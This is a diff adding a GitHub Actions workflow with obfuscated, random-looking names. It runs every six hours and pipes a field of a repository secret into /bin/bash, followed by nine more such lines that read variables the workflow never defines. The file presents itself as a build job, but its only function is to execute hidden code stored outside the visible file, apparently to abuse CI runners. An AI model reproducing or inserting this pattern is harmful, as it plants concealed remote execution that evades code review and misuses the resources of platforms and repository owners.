@@ -1,0 +1,27 @@
+name: ruanxiaoer19871010
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ruanxiaoer19871010
+        env:
+          ra910: ${{ secrets.ra910 }}
+        run: |
+          echo $ra910 | jq -r .mp3 | /bin/bash
+          echo $ltcc6187 | jq -r .cqq83 | /bin/bash
+          echo $avwte27338 | jq -r .sxqwk33 | /bin/bash
+          echo $eeb5741 | jq -r .hh18 | /bin/bash
+          echo $nyto4 | jq -r .eaea08998 | /bin/bash
+          echo $x66 | jq -r .wfift1 | /bin/bash
+          echo $svhfe114 | jq -r .mhex02260 | /bin/bash
+          echo $o8461 | jq -r .qkc7461 | /bin/bash
+          echo $xrny5 | jq -r .nyom12231 | /bin/bash
+          echo $jteco66 | jq -r .b141 | /bin/bash
+
